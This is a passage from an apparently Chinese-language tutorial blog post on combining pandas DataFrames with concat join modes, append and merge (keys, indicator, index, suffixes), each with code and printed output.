<h2 id="join参数"><a href="#join参数" class="headerlink" title="join参数"></a>join参数</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># join,['inner','outer']</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((3,4))<span class="number">*0</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>],index=[1,2,3])</span><br><span class="line">df2 = pd.DataFrame(np.ones((3,4))<span class="number">*1</span>,columns=[<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>],index=[2,3,4])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df2"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df2)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"对于标签不一样的 会把彼此没有的标签那一栏用nan填充  join默认outer模式"</span>)</span><br><span class="line">res = pd.concat([df1,df2],<span class="attribute">join</span>=<span class="string">'outer'</span>)  #对于标签不一样的 会把彼此没有的标签那一栏用nan填充  join默认outer模式</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"进行裁剪 将两者标签相同的部分保留"</span>)</span><br><span class="line">res = pd.concat([df1,df2],<span class="attribute">join</span>=<span class="string">'inner'</span>,ignore_index=True)  #进行裁剪 将两者标签相同的部分保留</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"按df1的索引 进行水平合并"</span>)</span><br><span class="line">res = pd.concat([df1,df2.reindex_like(df1)],<span class="attribute">axis</span>=1)  #按df1的索引 进行水平合并</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df1</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line">df2</span><br><span class="line">     b    c    d    e</span><br><span class="line"><span class="number">2</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">4</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">对于标签不一样的 会把彼此没有的标签那一栏用nan填充  join默认outer模式</span><br><span class="line">     a    b    c    d    e</span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  NaN</span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  NaN</span><br><span class="line"><span class="number">3</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  NaN</span><br><span class="line"><span class="number">2</span>  NaN  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">3</span>  NaN  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">4</span>  NaN  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">进行裁剪 将两者标签相同的部分保留</span><br><span class="line">     b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">4</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">5</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">按df1的索引 进行水平合并</span><br><span class="line">     a    b    c    d   a    b    c    d</span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span> NaN  NaN  NaN  NaN</span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span> NaN  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span> NaN  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br></pre></td></tr></table></figure></p>
<h2 id="append方法"><a href="#append方法" class="headerlink" title="append方法"></a>append方法</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># append</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((3,4))<span class="number">*0</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df2 = pd.DataFrame(np.ones((3,4))<span class="number">*1</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df3 = pd.DataFrame(np.ones((3,4))<span class="number">*2</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>],index=[2,3,4])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df2"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df2)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df3"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"将df2添加到df1并合并 重新排序"</span>)</span><br><span class="line">res = df1.append(df2,<span class="attribute">ignore_index</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"将df2,df3都添加到df1中  不重新排序"</span>)</span><br><span class="line">res = df1.append([df2,df3])</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"设置一个s1并添加到df1中 重新排序"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"s1"</span>)</span><br><span class="line">s1 = pd.Series([1,2,3,4],index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"><span class="builtin-name">print</span>(s1)</span><br><span class="line">res = df1.append(s1,<span class="attribute">ignore_index</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df1</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line">df2</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">df3</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">2</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">4</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line">将df2添加到df1并合并 重新排序</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">4</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">5</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">将df2,df3都添加到df1中  不重新排序</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">4</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line">设置一个s1矩阵并添加到df1中 重新排序</span><br><span class="line">s1</span><br><span class="line">a    <span class="number">1</span></span><br><span class="line">b    <span class="number">2</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">d    <span class="number">4</span></span><br><span class="line">dtype: <span class="built_in">int</span>64</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1.0</span>  <span class="number">2.0</span>  <span class="number">3.0</span>  <span class="number">4.0</span></span><br></pre></td></tr></table></figure></p>
<h1 id="merge合并"><a href="#merge合并" class="headerlink" title="merge合并"></a>merge合并</h1><p>简单的例子<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line">import pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"># merging two df by key/<span class="built_in">keys</span> (may <span class="keyword">be</span> used in database)</span><br><span class="line"># simple example</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span> = pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>,<span class="string">'K3'</span>],</span><br><span class="line">                     <span class="string">'A'</span>:[<span class="string">'A0'</span>,<span class="string">'A1'</span>,<span class="string">'A2'</span>,<span class="string">'A3'</span>],</span><br><span class="line">                     <span class="string">'B'</span>:[<span class="string">'B0'</span>,<span class="string">'B1'</span>,<span class="string">'B2'</span>,<span class="string">'B3'</span>]&#125;)</span><br><span class="line"><span class="keyword">right</span> = pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>,<span class="string">'K3'</span>],</span><br><span class="line">                      <span class="string">'C'</span>:[<span class="string">'C0'</span>,<span class="string">'C1'</span>,<span class="string">'C2'</span>,<span class="string">'C3'</span>],</span><br><span class="line">                      <span class="string">'D'</span>:[<span class="string">'D0'</span>,<span class="string">'D1'</span>,<span class="string">'D2'</span>,<span class="string">'D3'</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">left</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">right</span>)</span><br><span class="line"><span class="keyword">res</span> = pd.merge(<span class="keyword">left</span>,<span class="keyword">right</span>,<span class="keyword">on</span>=<span class="string">'key'</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">  key   A   <span class="keyword">B</span></span><br><span class="line"><span class="keyword">0 </span> K0  A0  <span class="keyword">B0</span></span><br><span class="line"><span class="keyword">1 </span> K1  <span class="built_in">A1</span>  <span class="keyword">B1</span></span><br><span class="line"><span class="keyword">2 </span> K2  <span class="built_in">A2</span>  <span class="keyword">B2</span></span><br><span class="line"><span class="keyword">3 </span> K3  <span class="built_in">A3</span>  <span class="keyword">B3</span></span><br><span class="line"><span class="keyword"> </span> key   C   D</span><br><span class="line"><span class="number">0</span>  K0  <span class="built_in">C0</span>  <span class="built_in">D0</span></span><br><span class="line"><span class="number">1</span>  K1  <span class="built_in">C1</span>  <span class="built_in">D1</span></span><br><span class="line"><span class="number">2</span>  K2  <span class="built_in">C2</span>  <span class="built_in">D2</span></span><br><span class="line"><span class="number">3</span>  K3  <span class="built_in">C3</span>  <span class="built_in">D3</span></span><br><span class="line">  key   A   <span class="keyword">B </span>  C   D</span><br><span class="line"><span class="number">0</span>  K0  A0  <span class="keyword">B0 </span> <span class="built_in">C0</span>  <span class="built_in">D0</span></span><br><span class="line"><span class="number">1</span>  K1  <span class="built_in">A1</span>  <span class="keyword">B1 </span> <span class="built_in">C1</span>  <span class="built_in">D1</span></span><br><span class="line"><span class="number">2</span>  K2  <span class="built_in">A2</span>  <span class="keyword">B2 </span> <span class="built_in">C2</span>  <span class="built_in">D2</span></span><br><span class="line"><span class="number">3</span>  K3  <span class="built_in">A3</span>  <span class="keyword">B3 </span> <span class="built_in">C3</span>  <span class="built_in">D3</span></span><br></pre></td></tr></table></figure></p>
<h2 id="两个key"><a href="#两个key" class="headerlink" title="两个key"></a>两个key</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line">import pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"># merging two df by key/<span class="built_in">keys</span> (may <span class="keyword">be</span> used in database)</span><br><span class="line"># consider two <span class="built_in">keys</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span> = pd.DataFrame(&#123;<span class="string">'key1'</span>:[<span class="string">'K0'</span>,<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>],</span><br><span class="line">                     <span class="string">'key2'</span>:[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K0'</span>,<span class="string">'K1'</span>],</span><br><span class="line">                     <span class="string">'A'</span>:[<span class="string">'A0'</span>,<span class="string">'A1'</span>,<span class="string">'A2'</span>,<span class="string">'A3'</span>],</span><br><span class="line">                     <span class="string">'B'</span>:[<span class="string">'B0'</span>,<span class="string">'B1'</span>,<span class="string">'B2'</span>,<span class="string">'B3'</span>]&#125;)</span><br><span class="line"><span class="keyword">right</span> = pd.DataFrame(&#123;<span class="string">'key1'</span>:[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>],</span><br><span class="line">                      <span class="string">'key2'</span>:[<span class="string">'K0'</span>,<span class="string">'K0'</span>,<span class="string">'K0'</span>,<span class="string">'K0'</span>],</span><br><span class="line">                      <span class="string">'C'</span>:[<span class="string">'C0'</span>,<span class="string">'C1'</span>,<span class="string">'C2'</span>,<span class="string">'C3'</span>],</span><br><span class="line">                      <span class="string">'D'</span>:[<span class="string">'D0'</span>,<span class="string">'D1'</span>,<span class="string">'D2'</span>,<span class="string">'D3'</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">left</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">right</span>)</span><br><span class="line">#how=[<span class="string">'inner'</span>,<span class="string">'outer'</span>,<span class="string">'left'</span>,<span class="string">'right'</span>]</span><br><span class="line"><span class="keyword">res</span> = pd.merge(<span class="keyword">left</span>,<span class="keyword">right</span>,<span class="keyword">on</span>=[<span class="string">'key1'</span>,<span class="string">'key2'</span>],how=<span class="string">'inner'</span>) #默认inner 只合并相同的数据</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">  key1 key2   A   <span class="keyword">B</span></span><br><span class="line"><span class="keyword">0 </span>  <span class="built_in">K0</span>   <span class="built_in">K0</span>  <span class="built_in">A0</span>  <span class="keyword">B0</span></span><br><span class="line"><span class="keyword">1 </span>  <span class="built_in">K0</span>   <span class="built_in">K1</span>  <span class="built_in">A1</span>  <span class="keyword">B1</span></span><br><span class="line"><span class="keyword">2 </span>  <span class="built_in">K1</span>   <span class="built_in">K0</span>  <span class="built_in">A2</span>  <span class="keyword">B2</span></span><br><span class="line"><span class="keyword">3 </span>  K2   <span class="built_in">K1</span>  <span class="built_in">A3</span>  <span class="keyword">B3</span></span><br><span class="line"><span class="keyword"> </span> key1 key2   C   D</span><br><span class="line"><span class="number">0</span>   <span class="built_in">K0</span>   <span class="built_in">K0</span>  C0  D0</span><br><span class="line"><span class="number">1</span>   <span class="built_in">K1</span>   <span class="built_in">K0</span>  C1  D1</span><br><span class="line"><span class="number">2</span>   <span class="built_in">K1</span>   <span class="built_in">K0</span>  C2  D2</span><br><span class="line"><span class="number">3</span>   K2   <span class="built_in">K0</span>  C3  D3</span><br><span class="line">  key1 key2   A   <span class="keyword">B </span>  C   D</span><br><span class="line"><span class="number">0</span>   <span class="built_in">K0</span>   <span class="built_in">K0</span>  <span class="built_in">A0</span>  <span class="keyword">B0 </span> C0  D0</span><br><span class="line"><span class="number">1</span>   <span class="built_in">K1</span>   <span class="built_in">K0</span>  <span class="built_in">A2</span>  <span class="keyword">B2 </span> C1  D1</span><br><span class="line"><span class="number">2</span>   <span class="built_in">K1</span>   <span class="built_in">K0</span>  <span class="built_in">A2</span>  <span class="keyword">B2 </span> C2  D2</span><br></pre></td></tr></table></figure></p>
<h2 id="indicator-显示以何做标签"><a href="#indicator-显示以何做标签" class="headerlink" title="indicator 显示以何做标签"></a>indicator 显示以何做标签</h2><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># merging two df by key/keys (may be used in database)</span></span><br><span class="line"><span class="comment"># indicator</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'col1'</span>:[<span class="number">0</span>,<span class="number">1</span>],<span class="string">'col_left'</span>:[<span class="string">'a'</span>,<span class="string">'b'</span>]&#125;)</span><br><span class="line">df2 = pd.DataFrame(&#123;<span class="string">'col1'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],<span class="string">'col_right'</span>:[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]&#125;)</span><br><span class="line"><span class="built_in">print</span>(df1)</span><br><span class="line"><span class="built_in">print</span>(df2)</span><br><span class="line"></span><br><span class="line">res = pd.merge(df1,df2,<span class="literal">on</span>=<span class="string">'col1'</span>,how=<span class="string">'outer'</span>,indicator=True)  <span class="comment">#显示合并是以哪一个df作为标签</span></span><br><span class="line"><span class="comment"># give the indicator a custom name</span></span><br><span class="line"><span class="comment"># res = pd.merge(df1,df2,on='col1',how='outer',indicator='indicator_column')</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">   col1 col_left</span><br><span class="line"><span class="number">0</span>     <span class="number">0</span>        a</span><br><span class="line"><span class="number">1</span>     <span class="number">1</span>        b</span><br><span class="line">   col1  col_right</span><br><span class="line"><span class="number">0</span>     <span class="number">1</span>          <span class="number">2</span></span><br><span class="line"><span class="number">1</span>     <span class="number">2</span>          <span class="number">2</span></span><br><span class="line"><span class="number">2</span>     <span class="number">2</span>          <span class="number">2</span></span><br><span class="line">   col1 col_left  col_right      _merge</span><br><span class="line"><span class="number">0</span>     <span class="number">0</span>        a        NaN   left_only</span><br><span class="line"><span class="number">1</span>     <span class="number">1</span>        b        <span class="number">2.0</span>        both</span><br><span class="line"><span class="number">2</span>     <span class="number">2</span>      NaN        <span class="number">2.0</span>  right_only</span><br><span class="line"><span class="number">3</span>     <span class="number">2</span>      NaN        <span class="number">2.0</span>  right_only</span><br></pre></td></tr></table></figure></p>
<h2 id="按索引合并"><a href="#按索引合并" class="headerlink" title="按索引合并"></a>按索引合并</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line">import pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"># merging two df by key/<span class="built_in">keys</span> (may <span class="keyword">be</span> used in database)</span><br><span class="line"># merged by <span class="built_in">index</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span> = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="string">'A0'</span>,<span class="string">'A1'</span>,<span class="string">'A2'</span>],</span><br><span class="line">                     <span class="string">'B'</span>:[<span class="string">'B0'</span>,<span class="string">'B1'</span>,<span class="string">'B2'</span>]&#125;,</span><br><span class="line">                    <span class="built_in">index</span>=[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>])</span><br><span class="line"><span class="keyword">right</span> = pd.DataFrame(&#123;<span class="string">'C'</span>:[<span class="string">'C0'</span>,<span class="string">'C2'</span>,<span class="string">'C3'</span>],</span><br><span class="line">                      <span class="string">'D'</span>:[<span class="string">'D0'</span>,<span class="string">'D2'</span>,<span class="string">'D3'</span>]&#125;,</span><br><span class="line">                     <span class="built_in">index</span>=[<span class="string">'K0'</span>,<span class="string">'K2'</span>,<span class="string">'K3'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">left</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">right</span>)</span><br><span class="line">#left_index <span class="built_in">and</span> right_index</span><br><span class="line"><span class="keyword">res</span> = pd.merge(<span class="keyword">left</span>,<span class="keyword">right</span>,left_index=True,right_index=True,how=<span class="string">'outer'</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br><span class="line"><span class="keyword">res</span> = pd.merge(<span class="keyword">left</span>,<span class="keyword">right</span>,left_index=True,right_index=True,how=<span class="string">'inner'</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">     A   <span class="keyword">B</span></span><br><span class="line"><span class="keyword">K0 </span> A0  <span class="keyword">B0</span></span><br><span class="line"><span class="keyword">K1 </span> <span class="built_in">A1</span>  <span class="keyword">B1</span></span><br><span class="line"><span class="keyword">K2 </span> <span class="built_in">A2</span>  <span class="keyword">B2</span></span><br><span class="line"><span class="keyword"> </span>    C   D</span><br><span class="line"><span class="symbol">K0</span>  <span class="built_in">C0</span>  <span class="built_in">D0</span></span><br><span class="line"><span class="symbol">K2</span>  <span class="built_in">C2</span>  <span class="built_in">D2</span></span><br><span class="line"><span class="symbol">K3</span>  <span class="built_in">C3</span>  <span class="built_in">D3</span></span><br><span class="line">      A    <span class="keyword">B </span>   C    D</span><br><span class="line"><span class="symbol">K0</span>   A0   <span class="keyword">B0 </span>  <span class="built_in">C0</span>   <span class="built_in">D0</span></span><br><span class="line"><span class="symbol">K1</span>   <span class="built_in">A1</span>   <span class="keyword">B1 </span> NaN  NaN</span><br><span class="line"><span class="symbol">K2</span>   <span class="built_in">A2</span>   <span class="keyword">B2 </span>  <span class="built_in">C2</span>   <span class="built_in">D2</span></span><br><span class="line"><span class="symbol">K3</span>  NaN  NaN   <span class="built_in">C3</span>   <span class="built_in">D3</span></span><br><span class="line">     A   <span class="keyword">B </span>  C   D</span><br><span class="line"><span class="symbol">K0</span>  A0  <span class="keyword">B0 </span> <span class="built_in">C0</span>  <span class="built_in">D0</span></span><br><span class="line"><span class="symbol">K2</span>  <span class="built_in">A2</span>  <span class="keyword">B2 </span> <span class="built_in">C2</span>  <span class="built_in">D2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="处理重叠"><a href="#处理重叠" class="headerlink" title="处理重叠"></a>处理重叠</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># merging two df by key/keys (may be used in database)</span></span><br><span class="line"><span class="comment"># handle overlapping</span></span><br><span class="line">boys = pd.DataFrame(&#123;<span class="string">'k'</span>:[<span class="string">'K0'</span>,<span class="string">'K1'</span>,<span class="string">'K2'</span>],<span class="string">'age'</span>:[1,2,3]&#125;)</span><br><span class="line"><span class="builtin-name">print</span>(boys)</span><br><span class="line"></span><br><span class="line">girls = pd.DataFrame(&#123;<span class="string">'k'</span>:[<span class="string">'K0'</span>,<span class="string">'K0'</span>,<span class="string">'K3'</span>],<span class="string">'age'</span>:[4,5,6]&#125;)</span><br><span class="line"><span class="builtin-name">print</span>(girls)</span><br><span class="line"></span><br><span class="line">res = pd.merge(boys,girls,<span class="attribute">on</span>=<span class="string">'k'</span>,suffixes=[<span class="string">'_boy'</span>,<span class="string">'_girl'</span>],<span class="attribute">how</span>=<span class="string">'inner'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">    k  age</span><br><span class="line"><span class="number">0</span>  K0    <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  K1    <span class="number">2</span></span><br><span class="line"><span class="number">2</span>  K2    <span class="number">3</span></span><br><span class="line">    k  age</span><br><span class="line"><span class="number">0</span>  K0    <span class="number">4</span></span><br><span class="line"><span class="number">1</span>  K0    <span class="number">5</span></span><br><span class="line"><span class="number">2</span>  K3    <span class="number">6</span></span><br><span class="line">    k  age_boy  age_girl</span><br><span class="line"><span class="number">0</span>  K0        <span class="number">1</span>         <span class="number">4</span></span><br><span class="line"><span class="number">1</span>  K0        <span class="number">1</span>         <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
